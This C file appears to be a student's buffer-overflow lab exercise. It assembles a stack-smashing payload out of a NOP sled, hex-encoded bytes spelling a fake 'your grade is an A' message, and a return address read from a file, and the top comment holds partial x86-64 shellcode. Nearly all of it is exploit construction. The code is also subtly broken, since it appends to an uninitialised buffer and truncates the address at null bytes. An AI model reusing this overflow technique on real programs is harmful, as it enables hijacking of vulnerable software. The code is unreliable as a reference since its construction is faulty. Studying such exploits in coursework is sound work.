/*\xeb\x30\x32\x54\x79\x6c\x65\x72\x20\x4b\x69\x6d\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41\x48\x31\xc0\xb0\x01\x48\x89\xc7
*/
#include <stdio.h>
#define FILELEN 16
#include <stdlib.h>
#define _OPEN_SYS_ITOA_EXT


int main(int argc, char** argv) {

    //216 = 48 + 12 + 160
    char bufferVal[216];    
    void* buffer;
    
    FILE *fp = fopen("address.txt","r");
    fscanf(fp, "%lx", (unsigned long)&buffer);
    fclose(fp);

    unsigned char* hack = (unsigned char*) &buffer;

    //printf("buffer address: %lx\n", buffer);

    //printf("%s", bufAdd);

    for(int i = 0; i < 130; i++) {
        strncat(bufferVal, "\x90", 1);
    }
    strncat(bufferVal, "\x54\x79\x6c\x65\x72\x20\x4b\x69\x6d\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41", 49);
    //printf("Size of bufferVal: %d", sizeof("\x54\x79\x6c\x65\x72\x20\x4b\x69\x6d\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41"));

    for(int i = 0; i < 31; i ++) {
        strncat(bufferVal, "\x90", 1);
    }

    strncat(bufferVal, hack, 8);
    //printf("Size: %d", sizeof(bufferVal));



    fputs(bufferVal, stdout);
    
    
    //strcat(bufferVal, buffer);
    //printf("%s", bufferVal);
    //fscanf(fp, "%lx", (unsigned long) &buffer);
    //printf("Buffer address: %lx\n", buffer);
    //char str[8];
    //sprintf(str, "%ld", buffer);
    //printf("ths string is: %lx", buffer);

    
    //printf("%s", bufferVal)

}  




